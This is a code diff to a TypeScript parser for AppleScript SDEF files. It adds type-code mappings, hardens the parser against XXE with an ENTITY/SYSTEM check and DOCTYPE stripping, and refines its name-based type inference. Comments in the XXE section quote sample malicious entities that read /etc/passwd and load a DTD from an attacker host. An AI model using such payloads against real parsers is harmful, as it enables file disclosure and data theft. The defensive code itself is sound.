@@ -129,6 +129,16 @@ const CODE_TO_TYPE_MAP: Record<string, string> = {
   rtyp: 'type', // Return type
   faal: 'list', // Modifier flags list
   data: 'any', // Generic data
+  'obj ': 'specifier', // Object specifier
+  reco: 'record', // Record type
+  list: 'list', // List type
+  bool: 'boolean', // Boolean type
+  long: 'integer', // Long integer
+  doub: 'real', // Double/real number
+  TEXT: 'text', // Text type
+  alis: 'file', // Alias (file reference)
+  fsrf: 'file', // File system reference
+  'ldt ': 'date', // Long date time
 };
 
 /**
@@ -143,6 +153,10 @@ const STANDARD_PARAM_TYPES: Record<string, string> = {
   as: 'type',
   saving: 'save options',
   by: 'property',
+  from: 'specifier',
+  at: 'location specifier',
+  for: 'specifier',
+  of: 'specifier',
 };
 
 /**
@@ -401,16 +415,64 @@ export class SDEFParser {
       // - Our approach: Targeted, efficient, and maintains security (Goldilocks solution)
       let contentWithoutComments = removeXMLComments(xmlContent);
 
-      // SECURITY: Verify no ENTITY declarations remain after comment removal
-      // We check for ENTITY only in actual XML, not in comments, to catch real XXE vulnerabilities
-      // Pattern matches both: <!ENTITY name SYSTEM "..."> and <!ENTITY % name "...">
-      if (/<!ENTITY/i.test(contentWithoutComments)) {
+      // SECURITY: Check for ENTITY declarations with SYSTEM references BEFORE stripping DOCTYPE
+      //
+      // WHY CHECK BEFORE STRIPPING:
+      // We need to detect and reject malicious ENTITY declarations even though we're going to
+      // strip the DOCTYPE anyway. This is defense-in-depth: we reject the XML entirely rather
+      // than silently allowing malicious XML to pass through after stripping.
+      //
+      // WHAT WE'RE CHECKING:
+      // Pattern matches: <!ENTITY (anything) SYSTEM (anything)>
+      // This catches both:
+      //   - <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      //   - <!ENTITY % file SYSTEM "http://attacker.com/evil.dtd">
+      //
+      // WHY THIS IS SECURE:
+      // 1. We already removed comments, so commented-out ENTITY declarations are ignored
+      // 2. We check before DOCTYPE stripping, so we catch malicious entities in DOCTYPE
+      // 3. We use a simple regex that can't be bypassed with encoding tricks
+      //
+      // LEGITIMATE USE CASE:
+      // Real SDEF files (Pages, Numbers, Keynote) use parameter entities WITHOUT SYSTEM:
+      //   <!ENTITY % text "...">  ← Allowed (no SYSTEM reference)
+      // These are NOT XXE vulnerabilities because they don't reference external files.
+      // Use negated character class to prevent ReDoS
+      if (/<!ENTITY[^>]*SYSTEM/i.test(contentWithoutComments)) {
         throw new Error(
-          'ENTITY declarations found in SDEF file - potential XXE vulnerability'
+          'XXE vulnerability detected: ENTITY declaration with SYSTEM reference found'
         );
       }
 
-      const parsed = this.parser.parse(xmlContent);
+      // SECURITY: Strip DOCTYPE declarations after checking for malicious ENTITY
+      //
+      // Legitimate SDEF files (Pages, Numbers, Keynote) use parameter entities in their
+      // DOCTYPE for DTD-based type definitions. We've already validated they don't use
+      // SYSTEM references above, so we can safely remove the entire DOCTYPE section.
+      //
+      // Since our XML parser is configured with ignoreDeclaration: true and never executes
+      // DOCTYPE processing, stripping is safe and prevents any residual XXE risk.
+      // Simplified pattern - safe from ReDoS
+      // Note: We strip DOCTYPE for security (XXE protection), so we don't need
+      // to preserve internal subsets. Simple greedy match is sufficient.
+      const contentWithoutDoctype = contentWithoutComments.replace(
+        /<!DOCTYPE[^>]*>/i,
+        ''
+      );
+
+      // SECURITY: Defensive check - verify no ENTITY declarations remain after DOCTYPE removal
+      // This should never trigger (DOCTYPE regex should remove all ENTITY declarations),
+      // but we check anyway as defense-in-depth against regex failures.
+      // Pattern matches both: <!ENTITY name SYSTEM "..."> and <!ENTITY % name "...">
+      if (/<!ENTITY/i.test(contentWithoutDoctype)) {
+        throw new Error(
+          'XXE vulnerability detected: ENTITY declaration found after DOCTYPE stripping'
+        );
+      }
+
+      // Parse the cleaned content (without DOCTYPE and comments) to prevent XXE attacks
+      // The XML parser is configured with ignoreDeclaration: true so DOCTYPE isn't processed anyway
+      const parsed = this.parser.parse(contentWithoutDoctype);
 
       if (!parsed.dictionary) {
         throw new Error('Invalid SDEF format: missing <dictionary> root element');
@@ -863,24 +925,31 @@ export class SDEFParser {
 
     // PRIORITY 2: Four-character code mapping
     if (elementCode) {
-      const trimmedCode = elementCode.trim();
-      const mappedType = CODE_TO_TYPE_MAP[trimmedCode];
-      if (mappedType) {
-        inferredType = this.parseType(mappedType);
+      // Normalize to exactly 4 characters (trim then pad to 4 chars)
+      // This handles codes with extra whitespace while preserving trailing spaces like 'obj ' and 'ldt '
+      const trimmed = elementCode.trim();
+      if (trimmed.length === 0) {
+        // Skip code-based inference for empty codes
+      } else {
+        const normalizedCode = trimmed.padEnd(4, ' ').slice(0, 4);
+        const mappedType = CODE_TO_TYPE_MAP[normalizedCode];
+        if (mappedType) {
+          inferredType = this.parseType(mappedType);
 
-        this.warn({
-          code: 'TYPE_INFERRED_FROM_CODE',
-          message: `Type inferred from four-character code "${trimmedCode}": ${mappedType}`,
-          location: {
-            element: context || 'unknown',
-            name: elementName,
-            suite: this.currentSuite,
-            command: this.currentCommand,
-          },
-          inferredValue: mappedType,
-        });
+          this.warn({
+            code: 'TYPE_INFERRED_FROM_CODE',
+            message: `Type inferred from four-character code "${elementCode}": ${mappedType}`,
+            location: {
+              element: context || 'unknown',
+              name: elementName,
+              suite: this.currentSuite,
+              command: this.currentCommand,
+            },
+            inferredValue: mappedType,
+          });
 
-        return inferredType;
+          return inferredType;
+        }
       }
     }
 
@@ -932,12 +1001,82 @@ export class SDEFParser {
       return inferredType;
     }
 
-    // Integer-related
+    // Date/time-related - match at word boundaries or camelCase boundaries
+    // Matches: "createdDate", "modifiedTime", "timestamp", "created_date"
+    // Rejects: "validate", "validated", "invalidate" (date not at boundary)
+    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
+    // Fix: Use alternation instead of negated character class to prevent ReDoS
+    if (/(^|_)(date|time|timestamp)($|_)/i.test(elementName) || /(Date|Time|Timestamp)/.test(elementName)) {
+      inferredType = { kind: 'date' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": date (matched date/time word)`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'date',
+      });
+
+      return inferredType;
+    }
+
+    // URL/URI-related - match at word boundaries or camelCase boundaries
+    // Matches: "websiteUrl", "resourceUri", "url", "uri"
+    // Rejects: "curious" (uri not at boundary)
+    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
+    // Fix: Use alternation instead of negated character class to prevent ReDoS
+    if (/(^|_)(url|uri)($|_)/i.test(elementName) || /(Url|Uri)/.test(elementName)) {
+      inferredType = { kind: 'primitive', type: 'text' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": text (matched URL/URI word)`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'text',
+      });
+
+      return inferredType;
+    }
+
+    // ID/Identifier-related - match at word boundaries or camelCase boundaries
+    // Matches: "userId", "uniqueIdentifier", "recordId", "user_id", "id"
+    // Rejects: "video", "audio", "validated" (id not at boundary)
+    // Pattern: Match keyword at start/end OR after underscore/before underscore OR capitalized (camelCase)
+    // Fix: Use alternation instead of negated character class to prevent ReDoS
+    if (/(^|_)(id|identifier)($|_)/i.test(elementName) || /(Id|Identifier)/.test(elementName)) {
+      inferredType = { kind: 'primitive', type: 'text' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": text (matched ID/identifier word)`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'text',
+      });
+
+      return inferredType;
+    }
+
+    // Integer-related patterns - use word boundaries to avoid phoneNumber, accountNumber, etc.
+    // Match: itemCount, pageNumber (at end), number (standalone)
+    // Don't match: phoneNumber, accountNumber, serialNumber (number at end of compound word should be text)
     if (
-      lowerName.includes('count') ||
-      lowerName.includes('index') ||
-      lowerName.includes('number') ||
-      lowerName.includes('size')
+      /(^|_)(count|index)($|_)|(Count|Index)/.test(elementName) ||
+      /^number$/i.test(lowerName) || // Only match "number" as standalone word
+      /(^|_)(size)($|_)/i.test(elementName) || /(Size)/.test(elementName)
     ) {
       inferredType = { kind: 'primitive', type: 'integer' };
 
@@ -956,12 +1095,14 @@ export class SDEFParser {
       return inferredType;
     }
 
-    // Boolean-related
+    // Boolean-related patterns - use prefix matching for camelCase conventions
+    // Match: isEnabled, hasPermission, canEdit
+    // Don't match: list, this, exists, dismiss
     if (
-      lowerName.includes('enabled') ||
-      lowerName.includes('disabled') ||
-      lowerName.includes('visible') ||
-      lowerName.includes('is')
+      /^(is|has|can|should|will)([A-Z]|_)/.test(elementName) || // camelCase: isEnabled, hasValue
+      /^(is|has|can|should|will)$/i.test(elementName) || // standalone: is, has, can
+      /(^|_)(enabled|disabled|visible)($|_)/i.test(elementName) || // word boundaries
+      /(Enabled|Disabled|Visible)/.test(elementName) // camelCase suffix
     ) {
       inferredType = { kind: 'primitive', type: 'boolean' };
 
